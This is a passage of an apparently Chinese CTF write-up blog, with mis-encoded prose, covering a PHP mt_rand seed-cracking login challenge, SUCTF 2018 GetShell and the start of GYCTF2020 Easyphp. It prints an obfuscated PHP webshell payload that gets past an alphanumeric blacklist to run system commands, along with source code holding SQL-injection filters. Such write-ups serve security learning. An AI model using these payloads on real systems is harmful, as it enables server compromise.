operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'*************'</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh:2; url=login.html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Private_key</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'************'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$getuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token operator">.</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">;</span>         <span class="token variable">$link</span><span class="token operator">=</span><span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">mysql_select_db</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$getuser</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr>&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/td>&lt;td>"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token comment">// genarate public_key </span><span class="token keyword">function</span> <span class="token function-definition function">public_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$public_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$public_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$public_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">//genarate private_key</span>  <span class="token keyword">function</span> <span class="token function-definition function">private_key</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$strings2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span><span class="token punctuation">;</span>    <span class="token variable">$private_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span>    <span class="token variable">$private_key</span> <span class="token operator">.=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$strings2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$private_key</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$Public_key</span> <span class="token operator">=</span> <span class="token function">public_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´ç§å­</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>key <span class="token operator">=</span> <span class="token string">'KVQP0LdJKRaV3n9D'</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> key<span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>            m <span class="token operator">+=</span> <span class="token string">"&#123;&#125; &#123;&#125; 0 &#123;&#125; "</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>çˆ†ç ´å‡ºç§å­ä¸º1775196155ï¼ŒæœåŠ¡å™¨PHPç‰ˆæœ¬ä¸º5.6.40ï¼Œçˆ†å‡ºprivate_keyï¼ŒadminåŠ ä¸‡èƒ½å¯†ç å³å¯</p><h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$black_char</span> <span class="token keyword">as</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stripos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal char"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é»‘åå•è¿‡æ»¤æµ‹è¯•åå‘ç°æ»¤æ‰äº†æ‰€æœ‰æ•°å­—å’Œå­—æ¯ï¼Œç”¨å–åæˆ–å¼‚æˆ–ç»•è¿‡</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>             <span class="token comment">//array</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token punctuation">;</span>         <span class="token comment">//arrayarray </span><span class="token variable">$__</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">==</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//trueï¼Œç»“æœä¸º1</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'èŒ‰'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'å†…'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//y</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'èŒ‰'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//s</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'è‹'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//t</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'çš„'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//e</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'å’©'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//m</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'è¯¾'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//P</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'å°¬'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//O</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'ç¬”'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//S</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'ç«¯'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//T</span><span class="token keyword">echo</span> <span class="token operator">~</span><span class="token string single-quoted-string">'ç'</span><span class="token punctuation">[</span><span class="token variable">$__</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¿™é‡Œå¯ä»¥è¿™ä¹ˆä½¿ç”¨æ˜¯å› ä¸ºUTF-8ç¼–ç åœ¨ç¼–ç æ±‰å­—æ—¶å®é™…ä¸Šæ˜¯ä½¿ç”¨äº†ä¸‰ä¸ªå•å­—ç¬¦æ‹¼æ¥ç¼–ç çš„ï¼Œä½¿ç”¨[]å³å¯å–å‡ºä¸­é—´çš„ä¸€ä¸ªå­—ç¬¦ï¼Œå†å¯¹è¿™ä¸ªå­—ç¬¦è¿›è¡Œå–åæ“ä½œï¼Œå°±å¯èƒ½èƒ½æ‰“å°å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦</p><p>æœ€ç»ˆpayloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">==</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token operator">~</span>èŒ‰<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>å†…<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>èŒ‰<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>è‹<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>çš„<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token operator">~</span>å’©<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">=</span><span class="token constant">_</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>è¯¾<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>å°¬<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>ç¬”<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_____</span><span class="token operator">.=</span><span class="token operator">~</span>ç«¯<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__________</span><span class="token operator">=</span><span class="token variable">$$_____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$__________</span><span class="token punctuation">[</span><span class="token operator">~</span>ç<span class="token punctuation">[</span><span class="token variable">$____</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p>ååºåˆ—åŒ–ï¼Œ<a href="http://www.zipæ‹¿æºç /">www.zipæ‹¿æºç </a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//lib.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'union'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'regexp'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'load'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'into'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'\\'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$mysqli</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ çš„IDæ˜¯"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"ä½ å¥½ï¼"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//è¿™ä¸ªåŠŸèƒ½è¿˜æ²¡æœ‰å†™å®Œ å…ˆå å‘</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å±</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">age</span><span class="token operator">=</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">nickname</span><span class="token operator">=</span><span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">CtrlCase</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> <span class="token class-name-definition class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$newInfo</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition 